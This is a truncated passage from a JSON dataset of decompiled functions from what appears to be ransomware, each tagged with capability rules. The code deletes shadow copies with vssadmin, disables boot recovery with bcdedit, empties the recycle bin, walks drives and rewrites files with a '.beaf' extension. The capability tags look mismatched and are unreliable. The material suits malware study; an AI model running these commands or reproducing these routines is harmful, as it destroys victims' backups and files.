        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404cc0(void)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    bool bVar8;\n    uint arg_8h;\n    char *arg_8h_00;\n    uint var_88h;\n    uint var_84h;\n    ushort var_7eh;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinW)(0, 0, 7);\n    pcVar2 = _sym.imp.KERNEL32.dll_WinExec;\n    (*_sym.imp.KERNEL32.dll_WinExec)(\"vssadmin.exe delete shadows /all /quiet\", 0);\n    (*pcVar2)(\"bcdedit.exe /set {default} recoveryenabled no\", 0);\n    (*pcVar2)(\"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\", 0);\n    arg_8h_00 = \"bcdedit.exe /set {current} recoveryenabled no\";\n    (*pcVar2)(\"bcdedit.exe /set {current} recoveryenabled no\", 0);\n    arg_8h = 0;\n    (*pcVar2)(\"bcdedit.exe /set {current} bootstatuspolicy ignoreallfailures\");\n    puVar7 = 0x4174b4;\n    puVar3 = 0x41d130;\n    do {\n        uVar1 = *puVar3;\n        bVar8 = uVar1 < *puVar7;\n        if (uVar1 != *puVar7) {\ncode_r0x00404d46:\n            iVar4 = (1 - bVar8) - (bVar8 != 0);\n            goto code_r0x00404d4b;\n        }\n        if (uVar1 == 0) break;\n        uVar1 = puVar3[1];\n        bVar8 = uVar1 < puVar7[1];\n        if (uVar1 != puVar7[1]) goto code_r0x00404d46;\n        puVar3 = puVar3 + 2;\n        puVar7 = puVar7 + 2;\n    } while (uVar1 != 0);\n    iVar4 = 0;\ncode_r0x00404d4b:\n    if (iVar4 == 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        pcVar2 = _sym.imp.KERNEL32.dll_GetDriveTypeW;\n        iVar4 = 1;\n        do {\n            if ((uVar5 & 1 << (iVar4 & 0x1f)) != 0) {\n                var_84h._0_2_ = iVar4 + 0x41;\n                stack0xffffff7a = 0x5c003a;\n                var_7eh = 0;\n                fcn.0040c5d0(&var_7ch, 0, 0x78);\n                iVar6 = (*pcVar2)(&var_84h);\n                if (((iVar6 != 5) && (iVar6 != 6)) && (iVar6 != 1)) {\n                    fcn.00404960(&var_84h);\n                }\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x1a);\n        fcn.00406bb6(arg_8h_00);\n        return;\n    }\n    fcn.00404960(0x41d130);\n    fcn.00406bb6(arg_8h);\n    return;\n}\n",
        "token_count": 847
    },
    "00404e10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Removing unreachable block (ram,0x00404fdd)\n// WARNING: Removing unreachable block (ram,0x00404ff1)\n// WARNING: Removing unreachable block (ram,0x0040502c)\n// WARNING: Removing unreachable block (ram,0x0040503a)\n// WARNING: Removing unreachable block (ram,0x0040504a)\n// WARNING: Removing unreachable block (ram,0x00405066)\n// WARNING: Removing unreachable block (ram,0x00405083)\n// WARNING: Removing unreachable block (ram,0x0040508e)\n// WARNING: Removing unreachable block (ram,0x0040510f)\n// WARNING: Removing unreachable block (ram,0x00405122)\n\nvoid fcn.00404e10(void)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uchar auStackY19316 [2092];\n    uint32_t uStackY17224;\n    uint uStackY17208;\n    uint32_t uStackY17204;\n    uchar uStackY17196;\n    uchar uStackY9004;\n    uint uStackY1692;\n    uint uStackY1688;\n    uint uStackY1684;\n    uint var_328h;\n    uint var_120h;\n    uint uStackY156;\n    uint arg_8h_00;\n    uint var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x41479b;\n    var_ch_2 = *in_FS_OFFSET;\n    fcn.0040f990();\n    *in_FS_OFFSET = &fcn.00404e10::var_ch_2;\n    arg_8h_00 = 3;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iVar1 != -1) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetFileSize)();\n        uStackY17196 = 0;\n        fcn.0040c5d0();\n        uStackY9004 = 0;\n        fcn.0040c5d0();\n        fcn.00406370(0x41d338);\n        uStackY17208 = 0;\n        uStackY17204 = 0xf;\n        uStackY17224 = uStackY17224 & 0xffffff00;\n        fcn.004012f0();\n        uStack8 = 0;\n        fcn.004017c0(&stack0xffffb48c);\n        uStackY1684 = 0x404f49;\n        fcn.00401990();\n        uStackY1684 = 0x40;\n        uStackY1688 = 0x41d338;\n        uStackY1692 = 0x404f5b;\n        fcn.00401a10();\n        if (0xf < uStackY17204) {\n            fcn.004072a9();\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n        if (iVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_ReadFile)();\n            fcn.00405c60(arg_8h, 0);\n            fcn.00407a13(&fcn.00404e10::var_328h, 0x104, 0x41cf20, 0x104);\n            uStackY156 = 0x405198;\n            fcn.00407fc7(&fcn.00404e10::var_328h, 0x104, L\".beaf\", 0x104);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)();\n            fcn.00407f94(0x41cf20, &fcn.00404e10::var_328h);\n        }\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.00406bb6(arg_8h_00);\n    return;\n}\n",
        "token_count": 966
    },
    "00405200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h_2\n\nvoid fcn.00405200(int16_t *param_1, uint param_2, uint param_3)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *arg_10h;\n    int32_t iVar6;\n    int32_t *in_FS_OFFSET;\n    bool bVar7;\n    int64_t iVar8;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_64h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uint32_t uStackY19432;\n    int32_t iStackY19428;\n    int16_t *piStackY19424;\n    int32_t iStackY19420;\n    uint32_t uStackY19416;\n    uchar *puStackY19412;\n    uint32_t uStackY19408;\n    int32_t iStackY19404;\n    uchar auStackY19400 [1608];\n    uchar auStackY17792 [484];\n    uint32_t uStackY17308;\n    uint uStackY17292;\n    uint32_t uStackY17288;\n    uchar auStackY17280 [8192];\n    uchar uStackY9088;\n    uint uStackY1692;\n    uint *puStackY1688;\n    uint uStackY1684;\n    uchar auStackY1680 [784];\n    uint var_37ch;\n    uint var_174h;\n    uint uStackY240;\n    int32_t iStackY236;\n    uchar *puStackY232;\n    uint uStackY228;\n    uchar *puStackY224;\n    uint uStackY220;\n    int32_t iStackY216;\n    uint uStackY212;\n    uint uStackY208;\n    uchar *puStackY204;\n    uint uStackY200;\n    int32_t iStackY196;\n    uint *puStackY192;\n    uint uStackY188;\n    uchar *puStackY184;\n    uint uStackY180;\n    int32_t iStackY176;\n    uint uStackY172;\n    uint uStackY168;\n    uchar *puStackY164;\n    uint uStackY160;\n    int32_t iStackY156;\n    uint var_64h_2;\n    uchar *puStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint arg_8h;\n    uint var_14h_2;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x41475b;\n    var_ch_3 = *in_FS_OFFSET;\n    fcn.0040f990();\n    *in_FS_OFFSET = &fcn.00405200::var_ch_3;\n    arg_8h = 3;\n    piStackY19424 = param_1;\n    iStackY19420 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iStackY19420 != -1) {\n        iVar8 = fcn.00405cf0(var_ch_2, var_10h);\n        if (iVar8 == 0) {\n            auStackY17280[0] = 0;\n            fcn.0040c5d0();\n            uStackY9088 = 0;\n            fcn.0040c5d0();\n            uStackY19408 = 0;\n            iStackY19404 = 0;\n            iVar6 = 0;\n            do {\n                uVar3 = fcn.00401740(0, 0xffffffff);\n                *(&fcn.00405200::var_64h_2 + iVar6) = uVar3;\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x40);\n            fcn.00406370(&fcn.00405200::var_64h_2);\n            uStackY17288 = 0xf;\n            uStackY17292 = 0;\n            uStackY17308 = uStackY17308 & 0xffffff00;\n            fcn.004012f0();\n            uStack8 = 0;\n            uStack80 = 0x40532d;\n            fcn.004017c0(&stack0xffffb438);\n            puStackY19412 = &stack0xfffff970;\n            uStackY1684 = 0x405346;\n            fcn.00401990();\n            puStackY1688 = &fcn.00405200::var_64h_2;\n            uStackY1684 = 0x40;\n            uStackY1692 = 0x405357;\n            fcn.00401a10();\n            if (0xf < uStackY17288) {\n                uStack80 = 0x405372;\n                fcn.004072a9();\n            }\n            iVar6 = iStackY19420;\n            uStack80 = 0;\n            uStack84 = 0;\n            uStack88 = 0;\n            iStack92 = iStackY19420;\n            iStack96 = 0x40538a;\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n            if (iVar4 == 0) {\n                iStack96 = iVar6;\n                puStack100 = 0x405395;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n            else {\n                iStack96 = 0;\n                puStack100 = &stack0xffffb430;\n                var_64h_2 = 0x2000;\n                uStackY19416 = 0;\n                puStackY19412 = NULL;\n                uStackY19432 = 0;\n                iStackY19428 = 0;\n                iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)();\n                pcVar2 = _sym.imp.KERNEL32.dll_WriteFile;\n                arg_10h = piStackY19424;\n                if (iVar6 == 1) {\n                    while ((arg_10h = piStackY19424,  uStackY19408 != 0 &&\n                           (iVar6 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(),  arg_10h = piStackY19424,  iVar6 != 0))\n                          ) {\n                        fcn.00405f70(&stack0xffffba80, &stack0xffffbc80);\n                        iVar6 = (*pcVar2)();\n                        arg_10h = piStackY19424;\n                        if ((iVar6 == 0) || ((iStackY19404 == 0 || (uStackY19408 < 0x2000)))) break;\n                        if ((puStackY19412 == NULL) && (uStackY19416 < 0x800)) {\n                            bVar7 = 0xfffffffe < uStackY19416;\n                            uStackY19416 = uStackY19416 + 1;\n                            puStackY19412 = bVar7;\n                        }\n                        else {\n                            bVar7 = 0xfffffffe < uStackY19432;\n                            uStackY19432 = uStackY19432 + 1;\n                            iStackY19428 = iStackY19428 + bVar7;\n                            if (*0x41d128 != -1) {\n                                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                                (*_sym.imp.KERNEL32.dll_SetEndOfFile)();\n                                arg_10h = piStackY19424;\n                                piVar5 = piStackY19424;\n                                do {\n                                    iVar1 = *piVar5;\n                                    piVar5 = piVar5 + 1;\n                                } while (iVar1 != 0);\n                                iStackY156 = *0x41d128;\n                                uStackY160 = 0x4054d8;\n                                (*pcVar2)();\n                                uStackY160 = 0;\n                                puStackY164 = &stack0xffffb434;\n                                uStackY168 = 4;\n                                uStackY172 = 0x419c08;\n                                iStackY176 = *0x41d128;\n                                uStackY180 = 0x4054f1;\n                                (*pcVar2)();\n                                uStackY180 = 0;\n                                puStackY184 = &stack0xffffb434;\n                                uStackY188 = 0x40;\n                                puStackY192 = &fcn.00405200::var_64h_2;\n                                iStackY196 = *0x41d128;\n                                uStackY200 = 0x405509;\n                                (*pcVar2)();\n                                uStackY200 = 0;\n                                puStackY204 = &stack0xffffb434;\n                                uStackY208 = 4;\n                                uStackY212 = 0x419c08;\n                                iStackY216 = *0x41d128;\n                                uStackY220 = 0x405522;\n                                (*pcVar2)();\n                                uStackY220 = 0;\n                                puStackY224 = &stack0xffffb434;\n                                uStackY228 = 8;\n                                puStackY232 = &stack0xffffb418;\n                                iStackY236 = *0x41d128;\n                                uStackY240 = 0x40553d;\n                                (*pcVar2)();\n                            }\n                            iVar6 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                            if (iVar6 == 0) break;\n                        }\n                        iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)();\n                        arg_10h = piStackY19424;\n                        if (iVar6 != 1) break;\n                    }\n                }\n                fcn.00405c60(var_ch_2, var_10h);\n                fcn.00407a13(&fcn.00405200::var_37ch, 0x104, arg_10h, 0x104);\n                iStackY156 = 0x4055e2;\n                fcn.00407fc7(&fcn.00405200::var_37ch, 0x104, L\".beaf\", 0x104);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                (*_sym.imp.KERNEL32.dll_SetEndOfFile)();\n                fcn.00407f94(arg_10h, &fcn.00405200::var_37ch);\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n    }\n    *in_FS_OFFSET = var_ch_3;\n    fcn.00406bb6(arg_8h);\n    return;\n}\n",
        "token_count": 2368
    },
    "00405920": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405920(void)\n\n{\n    uint16_t uVar1;\n    char16_t cVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint16_t *puVar7;\n    char16_t *pcVar8;\n    uint unaff_EDI;\n    bool bVar9;\n    uint *arg_8h;\n    uint var_678h;\n    uint var_674h;\n    uint hFindFile;\n    uint lpFindFileData;\n    uint32_t var_64ch;\n    uint32_t var_648h;\n    uint var_63ch;\n    ushort lpBuffer;\n    uint var_416h;\n    ushort lpFileName;\n    uint var_20eh;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    lpFileName = 0;\n    fcn.0040c5d0(&var_20eh, 0, 0x206);\n    lpBuffer = 0;\n    fcn.0040c5d0(&var_416h, 0, 0x206);\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(&lpBuffer, 0x104);\n    fcn.004081c0(&lpFileName, 0x104, unaff_EDI);\n    fcn.0040809d(&lpFileName, 0x104, 0x419c30);\n    arg_8h = &lpFindFileData;\n    iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(&lpFileName);\n    if (iVar4 != -1) {\n        do {\n            if ((lpFindFileData & 4) == 0) {\n                if ((lpFindFileData & 0x10) == 0) {\n                    puVar7 = 0x419adc;\n                    puVar6 = &var_63ch;\n                    do {\n                        uVar1 = *puVar6;\n                        bVar9 = uVar1 < *puVar7;\n                        if (uVar1 != *puVar7) {\ncode_r0x00405b46:\n                            iVar5 = (1 - bVar9) - (bVar9 != 0);\n                            goto code_r0x00405b4b;\n                        }\n                        if (uVar1 == 0) break;\n                        uVar1 = *(puVar6 + 2);\n                        bVar9 = uVar1 < puVar7[1];\n                        if (uVar1 != puVar7[1]) goto code_r0x00405b46;\n                        puVar6 = puVar6 + 1;\n                        puVar7 = puVar7 + 2;\n                    } while (uVar1 != 0);\n                    iVar5 = 0;\ncode_r0x00405b4b:\n                    if (iVar5 != 0) {\n                        pcVar8 = L\"Alad.alad\";\n                        puVar6 = &var_63ch;\n                        do {\n                            cVar2 = *puVar6;\n                            bVar9 = cVar2 < *pcVar8;\n                            if (cVar2 != *pcVar8) {\ncode_r0x00405b86:\n                                iVar5 = (1 - bVar9) - (bVar9 != 0);\n                                goto code_r0x00405b8b;\n                            }\n                            if (cVar2 == L'\\0') break;\n                            cVar2 = *(puVar6 + 2);\n                            bVar9 = cVar2 < pcVar8[1];\n                            if (cVar2 != pcVar8[1]) goto code_r0x00405b86;\n                            puVar6 = puVar6 + 1;\n                            pcVar8 = pcVar8 + 2;\n                        } while (cVar2 != L'\\0');\n                        iVar5 = 0;\ncode_r0x00405b8b:\n                        if (iVar5 != 0) {\n                            fcn.004081c0(&lpFileName, 0x104, unaff_EDI);\n                            fcn.0040809d(&lpFileName, 0x104, &var_63ch);\n                            if ((var_648h | var_64ch) != 0) {\n                                cVar3 = fcn.00405200(&lpFileName, var_648h, var_64ch);\n                                if (cVar3 == '\\x01') {\n                                    bVar9 = 0xfffffffe < *0x41cf18;\n                                    *0x41cf18 = *0x41cf18 + 1;\n                                    *0x41cf1c = *0x41cf1c + bVar9;\n                                }\n                                else {\n                                    fcn.00404960(&lpFileName);\n                                    bVar9 = 0xfffffffe < *0x41cf10;\n                                    *0x41cf10 = *0x41cf10 + 1;\n                                    *0x41cf14 = *0x41cf14 + bVar9;\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    fcn.004081c0(&lpFileName, 0x104, unaff_EDI);\n                    fcn.0040809d(&lpFileName, 0x104, &var_63ch);\n                    iVar5 = fcn.0041024d(&lpFileName, &lpBuffer);\n                    if (((iVar5 != 0) && (iVar5 = fcn.0041024d(&var_63ch, L\"System Volume Information\"),  iVar5 != 0))\n                       && (iVar5 = fcn.0041024d(&var_63ch, L\"internet explorer\"),  iVar5 != 0)) {\n                        puVar7 = 0x419c90;\n                        puVar6 = &var_63ch;\n                        do {\n                            uVar1 = *puVar6;\n                            bVar9 = uVar1 < *puVar7;\n                            if (uVar1 != *puVar7) {\ncode_r0x00405aad:\n                                iVar5 = (1 - bVar9) - (bVar9 != 0);\n                                goto code_r0x00405ab2;\n                            }\n                            if (uVar1 == 0) break;\n                            uVar1 = *(puVar6 + 2);\n                            bVar9 = uVar1 < puVar7[1];\n                            if (uVar1 != puVar7[1]) goto code_r0x00405aad;\n                            puVar6 = puVar6 + 1;\n                            puVar7 = puVar7 + 2;\n                        } while (uVar1 != 0);\n                        iVar5 = 0;\ncode_r0x00405ab2:\n                        if (iVar5 != 0) {\n                            puVar7 = 0x419c94;\n                            puVar6 = &var_63ch;\n                            do {\n                                uVar1 = *puVar6;\n                                bVar9 = uVar1 < *puVar7;\n                                if (uVar1 != *puVar7) {\ncode_r0x00405aeb:\n                                    iVar5 = (1 - bVar9) - (bVar9 != 0);\n                                    goto code_r0x00405af0;\n                                }\n                                if (uVar1 == 0) break;\n                                uVar1 = *(puVar6 + 2);\n                                bVar9 = uVar1 < puVar7[1];\n                                if (uVar1 != puVar7[1]) goto code_r0x00405aeb;\n                                puVar6 = puVar6 + 1;\n                                puVar7 = puVar7 + 2;\n                            } while (uVar1 != 0);\n                            iVar5 = 0;\ncode_r0x00405af0:\n                            if (iVar5 != 0) {\n                                fcn.00404960(&lpFileName);\n                            }\n                        }\n                    }\n                }\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar4, &lpFindFileData);\n        } while (iVar5 != 0);\n    }\n    (*_sym.imp.KERNEL32.dll_FindClose)(iVar4);\n    fcn.00406bb6(arg_8h);\n    return;\n}\n",
        "token_count": 1806
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405ed9)\n// WARNING: Removing unreachable block (ram,0x00405ecd)\n\nvoid __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_ESI;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uchar *puStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    int32_t iStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uchar auStack64 [4];\n    uchar auStack60 [8];\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    char16_t cStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    char16_t cStack24;\n    uint32_t uStack12;\n    \n    uStack12 = *0x41b0e4 ^ &stack0xffffffa4;\n    puStack108 = &stack0xffffffa4;\n    uStack112 = 0x405dc5;\n    uStack112 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    uStack116 = 0x405dcc;\n    (*_sym.imp.SHELL32.dll_CommandLineToArgvW)();\n    if (unaff_ESI < 3) {\n        cStack40 = str.window[6];\n        cStack24 = str.window[6];\n        uStack116 = 0x7f00;\n        uStack120 = 0;\n        uStack52 = str.window._0_4_;\n        uStack48 = str.window._4_4_;\n        uStack44 = str.window._8_4_;\n        uStack36 = str.window._0_4_;\n        uStack32 = str.window._4_4_;\n        uStack28 = str.window._8_4_;\n        uStack92 = 0;\n        uStack88 = 0x405f60;\n        uStack84 = 0;\n        uStack80 = 0;\n        uStack76 = argv;\n        uStack72 = 0;\n        uStack124 = 0x405e3d;\n        uStack76 = (*_sym.imp.USER32.dll_LoadCursorW)();\n        uStack124 = 0;\n        puStack128 = 0x405e48;\n        uStack76 = (*_sym.imp.GDI32.dll_GetStockObject)();\n        puStack128 = &stack0xffffff98;\n        puStack68 = &stack0xffffffc0;\n        uStack72 = 0;\n        uStack132 = 0x405e63;\n        iVar2 = (*_sym.imp.USER32.dll_RegisterClassW)();\n        pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n        if (iVar2 != 0) {\n            uStack116 = 0;\n            uStack120 = argv;\n            uStack124 = 0;\n            puStack128 = NULL;\n            uStack132 = 0x60;\n            uStack136 = 0x140;\n            uStack140 = 1;\n            iStack144 = 0x405e81;\n            iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)();\n            iStack144 = iVar3 / 2 + -0x30;\n            uStack148 = 0;\n            iStack152 = 0x405e8d;\n            iVar3 = (*pcVar1)();\n            iStack152 = iVar3 / 2 + -0xa0;\n            uStack156 = 0xcf0000;\n            puStack160 = &stack0xffffffd4;\n            puStack164 = &stack0xffffffc4;\n            uStack168 = 0;\n            uStack172 = 0x405eae;\n            uVar4 = (*_sym.imp.USER32.dll_CreateWindowExW)();\n            uStack172 = 0;\n            (*_sym.imp.USER32.dll_SetWindowLongW)(uVar4);\n            (*_sym.imp.USER32.dll_ShowWindow)(uVar4, 0);\n            fcn.004081c0(0x41d130, 0x104, 0);\n            fcn.0040c5d0(0x41d390, 0, 0x104);\n            uStack172 = 0x104;\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41d390, &stack0xffffff54);\n            if (iVar3 == 0) {\n                uVar4 = fcn.00401740(0, 100);\n                fcn.00406a70(\"COM_%d\", uVar4);\n            }\n            fcn.00405640();\n            (*_sym.imp.KERNEL32.dll_HeapSetInformation)(0, 1, 0, 0);\n        }\n    }\n    fcn.00406bb6(unaff_ESI);\n    return;\n}\n",
        "token_count": 1168
    },
    "00406bb6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406bb6(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x41b0e4) {\n        return;\n    }\n    *0x41c378 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x41c37c = &arg_8h;\n    *0x41c2b8 = 0x10001;\n    *0x41c260 = 0xc0000409;\n    *0x41c264 = 1;\n    var_328h = *0x41b0e4;\n    var_324h = *0x41b0e8;\n    *0x41c26c = unaff_retaddr;\n    *0x41c344 = in_GS;\n    *0x41c348 = in_FS;\n    *0x41c34c = in_ES;\n    *0x41c350 = in_DS;\n    *0x41c354 = unaff_EDI;\n    *0x41c358 = unaff_ESI;\n    *0x41c35c = unaff_EBX;\n    *0x41c360 = in_EDX;\n    *0x41c364 = in_ECX;\n    *0x41c368 = in_EAX;\n    *0x41c36c = unaff_EBP;\n    *0x41c370 = unaff_retaddr;\n    *0x41c374 = in_CS;\n    *0x41c380 = in_SS;\n    *0x41c2b0 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040c5c0(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x415524);\n    if (*0x41c2b0 == 0) {\n        fcn.0040c5c0(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 846
    },
    "0040870b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040870b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x41cc50, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0040ab71();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.0040ab2f(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "0040a22c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040a332: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040a337)\n// WARNING: Removing unreachable block (ram,0x0040a366)\n// WARNING: Removing unreachable block (ram,0x0040a33d)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a22c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a940(0x41a200, 0x20);\n    fcn.0040cb38(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x41c5f8 != 1) {\n        *0x41c5f4 = 1;\n        *0x41c5f0 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x41d5c8);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x41d5c4);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = 